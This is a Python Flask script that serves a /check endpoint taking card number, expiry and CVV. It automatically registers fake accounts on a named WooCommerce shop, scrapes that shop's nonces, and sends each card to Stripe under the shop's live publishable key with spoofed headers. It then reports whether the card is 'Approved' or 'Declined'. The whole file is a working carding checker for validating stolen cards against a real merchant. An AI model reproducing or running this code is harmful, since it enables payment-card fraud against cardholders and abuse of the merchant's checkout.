from flask import Flask, request, jsonify
import requests
import re
import random
import string

app = Flask(__name__)

# ==================== WEBSITE PROXY METHOD ====================
def check_via_website(cc, mm, yy, cvv):
    session = requests.Session()
    
    # Real Browser Headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'https://shop.wiseacrebrew.com',
        'Referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
    }
    session.headers.update(headers)

    # Year Fix
    if len(str(yy)) == 4:
        yy = str(yy)[-2:]

    try:
        # Step 1: Get Login Nonce
        r1 = session.get("https://shop.wiseacrebrew.com/account/", timeout=10)
        nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r1.text)
        if not nonce_match:
            return {"status": "Error", "response": "Site Nonce Error"}
        
        reg_nonce = nonce_match.group(1)

        # Step 2: Create Fake Account
        email = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + "@gmail.com"
        data = {
            'email': email, 'password': 'Test@12345',
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/account/', 'register': 'Register'
        }
        session.post("https://shop.wiseacrebrew.com/account/", data=data, timeout=10)

        # Step 3: Get Payment Nonce
        r2 = session.get("https://shop.wiseacrebrew.com/account/add-payment-method/", timeout=10)
        pay_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', r2.text)
        if not pay_nonce_match:
            return {"status": "Error", "response": "Payment Nonce Error"}
        
        ajax_nonce = pay_nonce_match.group(1)

        # Step 4: Stripe Token (Via Site's PK Key)
        stripe_data = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'key': 'pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy'
        }
        
        # Yahan Stripe ko lagega request site se aa rahi hai (Origin Header)
        r3 = session.post("https://api.stripe.com/v1/payment_methods", data=stripe_data, timeout=10)
        res3 = r3.json()

        if 'error' in res3:
            msg = res3['error'].get('message', 'Declined')
            return {"status": "Declined", "response": msg}

        pm_id = res3.get('id')
        if not pm_id:
            return {"status": "Error", "response": "Token Fail"}

        # Step 5: Final Auth
        final_data = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce
        }
        
        r4 = session.post("https://shop.wiseacrebrew.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=final_data, timeout=10)
        res4 = r4.json()

        if res4.get('status') == 'succeeded':
            return {"status": "Approved", "response": "Card Added Successfully"}
        elif 'error' in str(res4).lower():
             # Agar specific bank error aaye to bhi live hai
             err = res4.get('data', {}).get('error', {}).get('message', 'Declined')
             return {"status": "Declined", "response": err}
        else:
             return {"status": "Declined", "response": "Unknown"}

    except Exception as e:
        return {"status": "Error", "response": f"Exception: {str(e)[:30]}"}

# ==================== ENDPOINT ====================
@app.route('/check', methods=['GET'])
def check():
    cc = request.args.get('cc')
    if not cc:
        return jsonify({"status": "Error", "response": "Missing CC"})

    parts = cc.split('|')
    if len(parts) != 4:
        return jsonify({"status": "Error", "response": "Format: CC|MM|YY|CVV"})

    cc, mm, yy, cvv = parts
    res = check_via_website(cc, mm, yy, cvv)
    
    return jsonify(res)

if __name__ == '__main__':
    app.run(debug=True)
